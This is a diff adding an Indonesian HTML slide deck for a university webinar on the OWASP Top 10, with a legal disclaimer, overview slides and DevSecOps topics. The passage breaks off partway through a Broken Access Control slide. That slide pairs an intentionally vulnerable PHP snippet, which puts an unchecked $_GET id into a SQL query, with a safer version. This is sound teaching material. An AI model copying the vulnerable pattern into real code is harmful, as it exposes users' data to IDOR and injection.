@@ -1,0 +1,1557 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBERSHIELD 2026 — OWASP Top 10 | HIMTIF Universitas Pamulang</title>
+    <meta name="description" content="Presentasi OWASP Top 10 untuk webinar CYBERSHIELD 2026: From Code to Secure — HIMTIF Universitas Pamulang">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* ============================== */
+        /* CSS RESET & BASE              */
+        /* ============================== */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #0a0a1a;
+            --bg-secondary: #111128;
+            --bg-card: #1a1a3e;
+            --bg-code: #0d1117;
+            --text-primary: #e8e8f0;
+            --text-secondary: #a0a0c0;
+            --text-muted: #6a6a8a;
+            --accent-cyan: #00f0ff;
+            --accent-purple: #8b5cf6;
+            --accent-pink: #ec4899;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-amber: #f59e0b;
+            --accent-blue: #3b82f6;
+            --gradient-cyber: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-neon: linear-gradient(135deg, #00f0ff 0%, #8b5cf6 50%, #ec4899 100%);
+            --gradient-fire: linear-gradient(135deg, #ef4444 0%, #f59e0b 100%);
+            --gradient-ocean: linear-gradient(135deg, #0ea5e9 0%, #8b5cf6 100%);
+            --gradient-emerald: linear-gradient(135deg, #10b981 0%, #3b82f6 100%);
+            --shadow-glow: 0 0 30px rgba(0, 240, 255, 0.15);
+            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+            --radius: 16px;
+            --radius-sm: 8px;
+        }
+
+        html, body {
+            width: 100%; height: 100%;
+            font-family: var(--font-sans);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            overflow: hidden;
+        }
+
+        /* ============================== */
+        /* PRESENTATION CONTAINER         */
+        /* ============================== */
+        .presentation {
+            width: 100%; height: 100%;
+            position: relative;
+        }
+
+        .slide {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 60px 80px;
+            opacity: 0;
+            transform: translateX(60px);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: none;
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            opacity: 1;
+            transform: translateX(0);
+            pointer-events: auto;
+        }
+
+        .slide.prev {
+            opacity: 0;
+            transform: translateX(-60px);
+        }
+
+        /* ============================== */
+        /* PROGRESS BAR                  */
+        /* ============================== */
+        .progress-bar {
+            position: fixed;
+            top: 0; left: 0;
+            height: 4px;
+            background: var(--gradient-neon);
+            transition: width 0.5s ease;
+            z-index: 100;
+            border-radius: 0 2px 2px 0;
+        }
+
+        /* ============================== */
+        /* NAVIGATION                    */
+        /* ============================== */
+        .nav-controls {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            z-index: 90;
+            background: rgba(17, 17, 40, 0.9);
+            backdrop-filter: blur(20px);
+            padding: 12px 24px;
+            border-radius: 50px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .nav-btn {
+            width: 44px; height: 44px;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            background: transparent;
+            color: var(--text-primary);
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .nav-btn:hover {
+            background: rgba(139, 92, 246, 0.3);
+            border-color: var(--accent-purple);
+            transform: scale(1.1);
+        }
+
+        .nav-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .slide-counter {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            min-width: 80px;
+            text-align: center;
+        }
+
+        .fullscreen-btn {
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            width: 44px; height: 44px;
+            color: var(--text-primary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            font-size: 16px;
+        }
+
+        .fullscreen-btn:hover {
+            background: rgba(16, 185, 129, 0.3);
+            border-color: var(--accent-green);
+        }
+
+        /* ============================== */
+        /* TYPOGRAPHY                    */
+        /* ============================== */
+        .slide-title {
+            font-size: clamp(28px, 4vw, 48px);
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+        }
+
+        .slide-subtitle {
+            font-size: clamp(16px, 2vw, 22px);
+            font-weight: 400;
+            color: var(--text-secondary);
+            margin-bottom: 40px;
+            max-width: 700px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .gradient-text {
+            background: var(--gradient-neon);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .gradient-text-fire {
+            background: var(--gradient-fire);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .gradient-text-ocean {
+            background: var(--gradient-ocean);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .gradient-text-emerald {
+            background: var(--gradient-emerald);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ============================== */
+        /* CARDS & CONTENT               */
+        /* ============================== */
+        .content-wrapper {
+            width: 100%;
+            max-width: 1100px;
+            text-align: left;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius);
+            padding: 28px;
+            margin-bottom: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            border-color: rgba(139, 92, 246, 0.3);
+            box-shadow: var(--shadow-glow);
+            transform: translateY(-2px);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .card-icon {
+            font-size: 24px;
+            width: 48px; height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .card-tag {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            font-family: var(--font-mono);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .tag-critical { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
+        .tag-high { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
+        .tag-medium { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
+
+        /* ============================== */
+        /* CODE BLOCKS                   */
+        /* ============================== */
+        .code-comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        @media (max-width: 800px) {
+            .code-comparison { grid-template-columns: 1fr; }
+            .slide { padding: 30px 20px; }
+        }
+
+        .code-block {
+            background: var(--bg-code);
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .code-block-header {
+            padding: 10px 16px;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: var(--font-mono);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .code-block-header.vulnerable {
+            background: rgba(239, 68, 68, 0.15);
+            color: #ef4444;
+            border-bottom: 2px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .code-block-header.secure {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+            border-bottom: 2px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .code-content {
+            padding: 16px;
+            font-family: var(--font-mono);
+            font-size: 13px;
+            line-height: 1.7;
+            color: #c9d1d9;
+            overflow-x: auto;
+        }
+
+        .code-content .keyword { color: #ff7b72; }
+        .code-content .string { color: #a5d6ff; }
+        .code-content .function { color: #d2a8ff; }
+        .code-content .comment { color: #8b949e; font-style: italic; }
+        .code-content .variable { color: #ffa657; }
+        .code-content .highlight-bad { background: rgba(239, 68, 68, 0.15); display: inline; padding: 1px 4px; border-radius: 3px; }
+        .code-content .highlight-good { background: rgba(16, 185, 129, 0.15); display: inline; padding: 1px 4px; border-radius: 3px; }
+
+        /* ============================== */
+        /* GRID LAYOUTS                  */
+        /* ============================== */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            width: 100%;
+            max-width: 1100px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+            width: 100%;
+            max-width: 1100px;
+        }
+
+        .grid-5 {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 12px;
+            width: 100%;
+            max-width: 1100px;
+        }
+
+        @media (max-width: 800px) {
+            .grid-2, .grid-3, .grid-5 { grid-template-columns: 1fr; }
+        }
+
+        /* ============================== */
+        /* OWASP ITEM CARDS              */
+        /* ============================== */
+        .owasp-item {
+            background: var(--bg-card);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius);
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: default;
+        }
+
+        .owasp-item:hover {
+            transform: translateY(-4px);
+            border-color: rgba(0, 240, 255, 0.3);
+            box-shadow: 0 8px 30px rgba(0, 240, 255, 0.1);
+        }
+
+        .owasp-num {
+            font-size: 32px;
+            font-weight: 900;
+            font-family: var(--font-mono);
+            margin-bottom: 8px;
+        }
+
+        .owasp-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        /* ============================== */
+        /* IMPACT LIST                   */
+        /* ============================== */
+        .impact-list {
+            list-style: none;
+            margin-top: 12px;
+        }
+
+        .impact-list li {
+            padding: 8px 0;
+            padding-left: 28px;
+            position: relative;
+            color: var(--text-secondary);
+            font-size: 15px;
+            line-height: 1.5;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .impact-list li:last-child { border-bottom: none; }
+
+        .impact-list li::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 14px;
+            width: 8px; height: 8px;
+            border-radius: 50%;
+        }
+
+        .impact-list.danger li::before { background: var(--accent-red); box-shadow: 0 0 8px rgba(239, 68, 68, 0.4); }
+        .impact-list.success li::before { background: var(--accent-green); box-shadow: 0 0 8px rgba(16, 185, 129, 0.4); }
+
+        /* ============================== */
+        /* DISCLAIMER BANNER             */
+        /* ============================== */
+        .disclaimer-banner {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(245, 158, 11, 0.15));
+            border: 2px solid rgba(239, 68, 68, 0.4);
+            border-radius: var(--radius);
+            padding: 30px;
+            max-width: 900px;
+            text-align: center;
+        }
+
+        .disclaimer-banner h2 {
+            color: var(--accent-red);
+            font-size: 24px;
+            margin-bottom: 16px;
+        }
+
+        .disclaimer-banner p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            font-size: 16px;
+        }
+
+        .disclaimer-banner strong { color: var(--accent-amber); }
+
+        .law-ref {
+            display: inline-block;
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 4px;
+            font-family: var(--font-mono);
+        }
+
+        /* ============================== */
+        /* CHEAT SHEET TABLE             */
+        /* ============================== */
+        .cheat-table {
+            width: 100%;
+            max-width: 1100px;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        .cheat-table th {
+            background: rgba(139, 92, 246, 0.2);
+            color: var(--accent-purple);
+            padding: 12px 16px;
+            text-align: left;
+            font-weight: 700;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid rgba(139, 92, 246, 0.3);
+        }
+
+        .cheat-table td {
+            padding: 10px 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-secondary);
+            vertical-align: top;
+        }
+
+        .cheat-table tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .cheat-table code {
+            background: var(--bg-code);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            color: var(--accent-cyan);
+        }
+
+        /* ============================== */
+        /* COVER SLIDE SPECIAL           */
+        /* ============================== */
+        .cover-badge {
+            display: inline-block;
+            padding: 6px 20px;
+            border-radius: 30px;
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            background: rgba(0, 240, 255, 0.08);
+            color: var(--accent-cyan);
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-family: var(--font-mono);
+        }
+
+        .cover-title {
+            font-size: clamp(36px, 6vw, 72px);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            letter-spacing: -0.03em;
+        }
+
+        .cover-subtitle {
+            font-size: clamp(14px, 2vw, 20px);
+            color: var(--text-secondary);
+            max-width: 600px;
+            text-align: center;
+            line-height: 1.7;
+            margin-bottom: 32px;
+        }
+
+        .cover-meta {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        /* ============================== */
+        /* ANIMATED BACKGROUND           */
+        /* ============================== */
+        .bg-grid {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image:
+                linear-gradient(rgba(139, 92, 246, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(139, 92, 246, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-glow {
+            position: fixed;
+            width: 600px; height: 600px;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.15;
+            z-index: 0;
+            pointer-events: none;
+            animation: floatGlow 20s ease-in-out infinite;
+        }
+
+        .bg-glow-1 { background: #8b5cf6; top: -200px; right: -100px; }
+        .bg-glow-2 { background: #00f0ff; bottom: -200px; left: -100px; animation-delay: -10s; }
+        .bg-glow-3 { background: #ec4899; top: 50%; left: 50%; transform: translate(-50%, -50%); animation-delay: -5s; opacity: 0.08; }
+
+        @keyframes floatGlow {
+            0%, 100% { transform: translate(0, 0); }
+            33% { transform: translate(30px, -30px); }
+            66% { transform: translate(-20px, 20px); }
+        }
+
+        /* ============================== */
+        /* SECTION INDICATOR             */
+        /* ============================== */
+        .section-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: var(--font-mono);
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .badge-a01 { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-a02 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-a03 { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-a04 { background: rgba(59, 130, 246, 0.15); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .badge-a05 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-a06 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-a07 { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-a08 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-a09 { background: rgba(59, 130, 246, 0.15); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .badge-a10 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-bonus { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; border: 1px solid rgba(139, 92, 246, 0.3); }
+
+        /* ============================== */
+        /* PRINT STYLES                  */
+        /* ============================== */
+        @media print {
+            .slide { 
+                position: relative !important;
+                opacity: 1 !important;
+                transform: none !important;
+                pointer-events: auto !important;
+                page-break-after: always;
+                min-height: 100vh;
+            }
+            .nav-controls, .progress-bar, .bg-grid, .bg-glow, .fullscreen-btn { display: none !important; }
+        }
+
+        /* Keyboard hint */
+        .keyboard-hint {
+            position: fixed;
+            bottom: 90px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: var(--text-muted);
+            z-index: 90;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+        .keyboard-hint.visible { opacity: 1; }
+        kbd {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 4px;
+            padding: 2px 6px;
+            font-family: var(--font-mono);
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background effects -->
+    <div class="bg-grid"></div>
+    <div class="bg-glow bg-glow-1"></div>
+    <div class="bg-glow bg-glow-2"></div>
+    <div class="bg-glow bg-glow-3"></div>
+
+    <!-- Progress bar -->
+    <div class="progress-bar" id="progressBar"></div>
+
+    <!-- Keyboard hint -->
+    <div class="keyboard-hint" id="keyboardHint">
+        Gunakan <kbd>←</kbd> <kbd>→</kbd> untuk navigasi &nbsp;|&nbsp; <kbd>F</kbd> fullscreen
+    </div>
+
+    <div class="presentation" id="presentation">
+
+        <!-- ======================================== -->
+        <!-- SLIDE 0: COVER                           -->
+        <!-- ======================================== -->
+        <div class="slide active" data-slide="0">
+            <div class="cover-badge">🛡️ WEBINAR HIMTIF 2026</div>
+            <h1 class="cover-title">
+                <span class="gradient-text">CYBERSHIELD</span>
+            </h1>
+            <p class="cover-subtitle">
+                <strong>From Code to Secure</strong><br>
+                Memahami Pengembangan dan Keamanan Produk Digital di Industri TI
+            </p>
+            <p class="cover-subtitle" style="font-size:18px; margin-bottom:20px;">
+                🔒 <strong>OWASP Top 10</strong> — Kerentanan & Pencegahan
+            </p>
+            <p class="cover-meta">
+                Himpunan Mahasiswa Teknik Informatika — Universitas Pamulang<br>
+                <span style="color: var(--accent-cyan);">24 September 2026</span>
+            </p>
+            <div style="margin-top: 35px; z-index: 100;">
+                <a href="Animasi/index.html" target="_blank" style="display:inline-block; padding: 12px 24px; background: rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.4); border-radius: 8px; color: #fff; text-decoration: none; font-weight: bold; transition: all 0.3s; font-family: var(--font-mono); letter-spacing: 1px;">▶ LIHAT ANIMASI KERENTANAN</a>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 1: DISCLAIMER                      -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="1">
+            <div class="disclaimer-banner">
+                <h2>⚠️ DISCLAIMER HUKUM — WAJIB DIBACA</h2>
+                <p>
+                    Seluruh materi dalam presentasi ini disediakan <strong>SEMATA-MATA untuk tujuan EDUKASI</strong>.<br><br>
+                    Melakukan hacking, penetration testing, atau security testing pada sistem <strong>TANPA IZIN TERTULIS</strong> adalah <strong>TINDAKAN PIDANA</strong>.
+                </p>
+                <div style="margin-top: 20px;">
+                    <span class="law-ref">UU ITE Pasal 30 — Penjara 6-8 Tahun</span>
+                    <span class="law-ref">UU ITE Pasal 32 — Denda 2 Miliar</span>
+                    <span class="law-ref">UU ITE Pasal 33 — Penjara 10 Tahun</span>
+                </div>
+                <p style="margin-top: 20px; font-size: 14px;">
+                    🔒 <strong>Selalu minta IZIN TERTULIS</strong> sebelum melakukan pengujian keamanan<br>
+                    📋 Patuhi <strong>scope dan rules of engagement</strong> yang disepakati<br>
+                    🤝 Praktikkan <strong>responsible disclosure</strong> untuk temuan kerentanan
+                </p>
+                <p style="margin-top:20px; font-size: 18px; color: var(--accent-cyan);">
+                    <em>"Hack Responsibly. Learn Ethically. Code Securely."</em>
+                </p>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 2: APA ITU OWASP?                  -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="2">
+            <h1 class="slide-title">Apa itu <span class="gradient-text">OWASP</span>?</h1>
+            <p class="slide-subtitle">
+                Open Worldwide Application Security Project — Komunitas global yang berfokus pada keamanan perangkat lunak.
+            </p>
+            <div class="grid-3">
+                <div class="card" style="text-align:center;">
+                    <div style="font-size:48px; margin-bottom:12px;">🌍</div>
+                    <div class="card-title" style="margin-bottom:8px;">Komunitas Global</div>
+                    <p style="color:var(--text-secondary); font-size:14px;">Non-profit foundation dengan ribuan kontributor di seluruh dunia.</p>
+                </div>
+                <div class="card" style="text-align:center;">
+                    <div style="font-size:48px; margin-bottom:12px;">📋</div>
+                    <div class="card-title" style="margin-bottom:8px;">OWASP Top 10</div>
+                    <p style="color:var(--text-secondary); font-size:14px;">Daftar 10 risiko keamanan aplikasi web paling kritis, diperbarui secara berkala.</p>
+                </div>
+                <div class="card" style="text-align:center;">
+                    <div style="font-size:48px; margin-bottom:12px;">🛠️</div>
+                    <div class="card-title" style="margin-bottom:8px;">Tools & Resources</div>
+                    <p style="color:var(--text-secondary); font-size:14px;">Testing Guide, Cheat Sheets, ZAP Scanner, dan ratusan project keamanan.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 3: OWASP TOP 10 OVERVIEW           -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="3">
+            <h1 class="slide-title" style="margin-bottom:30px;">OWASP Top 10 <span class="gradient-text-fire">(2021)</span></h1>
+            <div class="grid-5">
+                <div class="owasp-item"><div class="owasp-num" style="color:#ef4444;">A01</div><div class="owasp-name">Broken Access Control</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#f59e0b;">A02</div><div class="owasp-name">Cryptographic Failures</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#ef4444;">A03</div><div class="owasp-name">Injection</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#3b82f6;">A04</div><div class="owasp-name">Insecure Design</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#f59e0b;">A05</div><div class="owasp-name">Security Misconfiguration</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#f59e0b;">A06</div><div class="owasp-name">Vulnerable Components</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#ef4444;">A07</div><div class="owasp-name">Auth Failures</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#f59e0b;">A08</div><div class="owasp-name">Data Integrity Failures</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#3b82f6;">A09</div><div class="owasp-name">Logging Failures</div></div>
+                <div class="owasp-item"><div class="owasp-num" style="color:#f59e0b;">A10</div><div class="owasp-name">SSRF</div></div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE: SHIFT LEFT SECURITY               -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="3-1">
+            <h1 class="slide-title">Shift Left <span class="gradient-text-ocean">Security</span></h1>
+            <p class="slide-subtitle" style="max-width: 900px; text-align: center; margin: 0 auto 30px;">
+                <strong>OWASP</strong> adalah yayasan nirlaba global penyedia panduan keamanan <em>open-source</em>.<br>
+                <strong>OWASP Top 10</strong> mewakili 10 risiko kerentanan paling kritis bagi web developer.
+            </p>
+            <div class="grid-2" style="align-items: center; max-width: 1050px;">
+                <div style="text-align: left;">
+                    <p style="color:var(--text-secondary); line-height:1.7; font-size: 16px; margin-bottom:15px;">
+                        <strong>Shift Left Security</strong> adalah pendekatan yang menggeser pengujian keamanan ke tahap paling awal dalam <em>Software Development Life Cycle</em> (SDLC) — atau "ke kiri" jika divisualisasikan dalam garis waktu pengembangan.
+                    </p>
+                    <p style="color:var(--text-secondary); line-height:1.7; font-size: 16px;">
+                        Secara tradisional, <em>penetration testing</em> dilakukan di akhir siklus. Dengan <em>Shift Left</em>, pemeriksaan dilakukan sejak awal melalui <em>code review</em>, pemindaian statis, dan otomatisasi. Tujuannya menambal celah saat biaya perbaikannya masih sangat murah.
+                    </p>
+                </div>
+                <div>
+                    <img src="https://orca.security/wp-content/uploads/2024/07/orca-blog-what-is-shift-left-security-image-1.png?resize=1200,668" alt="Shift Left Security" style="width: 100%; border-radius: var(--radius); border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,240,255,0.15);">
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE: MATERI CYBERSHIELD PART 1         -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="3-2">
+            <h1 class="slide-title">Materi: <span class="gradient-text">From Code to Zero</span></h1>
+            <p class="slide-subtitle">Mengisyaratkan perjalanan dari penulisan kode sumber hingga kondisi infrastruktur Zero Trust.</p>
+            
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon" style="background: rgba(16, 185, 129, 0.15); color: var(--accent-green);">💻</div>
+                        <div class="card-title">1. The Code: Membangun Fondasi</div>
+                    </div>
+                    <ul class="impact-list">
+                        <li><strong>Mindset Shift Left:</strong> Menemukan bug di tahap <em>text editor</em> jauh lebih murah dibanding saat rilis.</li>
+                        <li><strong>Secure Coding Practices:</strong> Praktik menulis kode kebal sejak awal (misal: sanitasi, <em>prepared statements</em>).</li>
+                        <li><strong>SAST:</strong> Penggunaan otomatisasi (SonarQube/PHPStan) untuk menyoroti rentan sebelum dieksekusi.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon" style="background: rgba(239, 68, 68, 0.15); color: var(--accent-red);">🐛</div>
+                        <div class="card-title">2. The Vulnerabilities: Membedah OWASP</div>
+                    </div>
+                    <ul class="impact-list">
+                        <li><strong>Broken Access Control:</strong> Manipulasi parameter URL (IDOR) untuk mengakses profil orang lain.</li>
+                        <li><strong>Injection & XSS:</strong> Input berbahaya yang sukses membajak database atau eksekusi script browser.</li>
+                        <li><strong>Misconfiguration:</strong> Bahaya <em>debug mode</em> aktif dan tereksposnya file <code>.env</code> di production.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE: MATERI CYBERSHIELD PART 2         -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="3-3">
+            <h1 class="slide-title">Materi: <span class="gradient-text">From Code to Zero</span></h1>
+            
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon" style="background: rgba(59, 130, 246, 0.15); color: var(--accent-blue);">⚙️</div>
+                        <div class="card-title">3. The Pipeline: DevSecOps</div>
+                    </div>
+                    <ul class="impact-list">
+                        <li><strong>SCA (Software Composition Analysis):</strong> Memindai CVE pada package pihak ketiga (NPM/Composer).</li>
+                        <li><strong>CI/CD Security:</strong> Otomatis menolak <em>pull request</em> jika kode mengandung celah lewat GitHub Actions.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon" style="background: rgba(139, 92, 246, 0.15); color: var(--accent-purple);">🛡️</div>
+                        <div class="card-title">4. The Zero: Menuju Zero Trust</div>
+                    </div>
+                    <ul class="impact-list">
+                        <li><strong>Container Security:</strong> Praktik aman di Docker (hindari akses <em>root</em>, pindai dengan Trivy).</li>
+                        <li><strong>Zero Trust Architecture:</strong> <em>Never trust, always verify</em>. Jangan menganggap jaringan internal otomatis aman (Least Privilege).</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 4: A01 BROKEN ACCESS CONTROL       -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="4">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a01">🔴 A01:2021 — Critical</span>
+                <h1 class="slide-title">Broken Access <span class="gradient-text-fire">Control</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    User bisa mengakses data atau melakukan aksi di luar izin yang seharusnya. <strong>Naik dari posisi #5 ke #1</strong> di OWASP 2021.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN — vuln.php</div>
+                        <div class="code-content">
+<span class="comment">// IDOR — user bisa akses data user lain</span>
+<span class="variable">$user_id</span> = <span class="highlight-bad"><span class="variable">$_GET</span>[<span class="string">'id'</span>]</span>;
+<span class="variable">$query</span> = <span class="string">"SELECT * FROM users
+  WHERE id = <span class="highlight-bad">$user_id</span>"</span>;
+<span class="comment">// Ubah ?id=1 → lihat data admin!</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN — secure.php</div>
+                        <div class="code-content">
+<span class="comment">// Cek otorisasi + prepared statement</span>
+<span class="keyword">if</span> (<span class="highlight-good"><span class="variable">$requested_id</span> !== <span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>]</span>) {
+  <span class="function">http_response_code</span>(<span class="string">403</span>);
+  <span class="keyword">die</span>(<span class="string">"Akses ditolak"</span>);
+}
